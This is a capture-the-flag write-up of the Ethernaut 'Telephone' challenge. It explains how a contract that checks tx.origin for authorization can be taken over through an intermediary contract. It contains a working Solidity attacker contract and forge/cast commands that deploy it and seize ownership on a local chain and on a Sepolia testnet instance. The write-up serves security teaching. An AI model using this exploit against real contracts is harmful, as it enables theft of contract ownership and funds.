# Ethernaut Challenge 04 — Telephone

This challenge demonstrates why using `tx.origin` for authorization is insecure.

The goal is to exploit the contract logic so that our address becomes the owner.

Instance address:

```
0x4b0e263C8E936DEf791EbAf420EaeF8F8c0A574B
```

---

## 🎯 Goal

The challenge is solved when the `owner` of the contract becomes our address.

---

## 🧠 Thought process

The core logic of the contract is inside the `changeOwner()` function:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

To understand the vulnerability, it is important to recall the difference between `tx.origin` and `msg.sender`.

- `tx.origin` is the **original external account that started the transaction**
- `msg.sender` is the **immediate caller of the current function**

If a user calls `changeOwner()` directly from their wallet:

```
tx.origin == msg.sender
```

In that case the condition fails and the owner cannot be changed.

However, if the call is made **through another contract**, the situation becomes:

```
tx.origin = user's wallet
msg.sender = attacking contract
```

Since these two addresses are different, the condition becomes true and the contract allows the ownership change.

Therefore the exploit is simple:

1. deploy a contract that calls `changeOwner()`
2. call the attacker contract from our wallet
3. the attacker contract becomes `msg.sender`
4. the condition `tx.origin != msg.sender` becomes true
5. the owner is changed to our address

---

## 🧪 Step 1 — Build an attacker contract

To exploit the vulnerability, I created a contract that calls `changeOwner()` on the target contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone private s_telephone;
    
    constructor(address _telephone) {
        s_telephone = ITelephone(_telephone);
    }

    function attack(address _owner) external {
        s_telephone.changeOwner(_owner);
    } 
}
```

When a user calls `attack()`:

- the transaction is initiated by the user's wallet (`tx.origin`)
- the caller of `changeOwner()` becomes the attacker contract (`msg.sender`)

This satisfies the condition required by the vulnerable contract.

---

## 🧪 Step 2 — Test the exploit locally on Anvil

Start Anvil:

```bash
anvil
```

Deploy the `Telephone` contract using the account:

```
0x70997970C51812dc3A010C7d01b50e0d17dc79C8
```

which corresponds to the private key:

```
0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
```

Deploy the contract:

```bash
forge create src/challenge-04-telephone/Telephone.sol:Telephone \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d \
  --broadcast
```

Deployed `Telephone` address:

```
0x8464135c8F25Da09e49BC8782676a84730C318bC
```

Deploy the attacker contract:

```bash
forge create src/challenge-04-telephone/TelephoneAttacker.sol:TelephoneAttacker \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d \
  --broadcast \
  --constructor-args 0x8464135c8F25Da09e49BC8782676a84730C318bC
```

Deployed `TelephoneAttacker` address:

```
0x71C95911E9a5D330f4D621842EC243EE1343292e
```

Now call the attack function.

The private key:

```
0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

corresponds to the address:

```
0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
```

Execute the exploit:

```bash
cast send 0x71C95911E9a5D330f4D621842EC243EE1343292e \
    "attack(address)" 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 \
    --rpc-url http://127.0.0.1:8545 \
    --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

Verify the owner:

```bash
cast call 0x8464135c8F25Da09e49BC8782676a84730C318bC \
    "owner()" \
    --rpc-url http://127.0.0.1:8545
```

Result:

```
0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266
```

The owner was successfully changed.

---

## 🚀 Step 3 — Execute the exploit on Sepolia

The Ethernaut instance is deployed at:

```
0x4b0e263C8E936DEf791EbAf420EaeF8F8c0A574B
```

Load the Sepolia RPC URL:

```bash
source .env
```

Deploy the attacker contract:

```bash
forge create src/challenge-04-telephone/TelephoneAttacker.sol:TelephoneAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args 0x4b0e263C8E936DEf791EbAf420EaeF8F8c0A574B
```

Deployed `TelephoneAttacker` address:

```
0xE8c0acB4bb93578013f6d668a0393c3304c1d151
```

Execute the exploit:

```bash
cast send 0xE8c0acB4bb93578013f6d668a0393c3304c1d151 \
    "attack(address)" 0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```
0xf29dc322fe7faf45c94bfd4e8256fe68bd130861baab9f7101541099fbb22d3c
```

---

## ✅ Step 4 — Verify the result

Check the owner:

```bash
cast call 0x4b0e263C8E936DEf791EbAf420EaeF8F8c0A574B \
    "owner()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x000000000000000000000000ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

The contract owner is now my address, so the challenge is completed.

---

## 🛡️ Security takeaway

This challenge highlights why **`tx.origin` should never be used for authorization**.

Key lessons:

- `tx.origin` represents the original EOA that started the transaction
- `msg.sender` represents the immediate caller of the function
- when contracts interact with each other, these values differ
- using `tx.origin` for access control allows attackers to bypass checks through intermediary contracts

Secure contracts should always rely on **`msg.sender` for authorization logic**.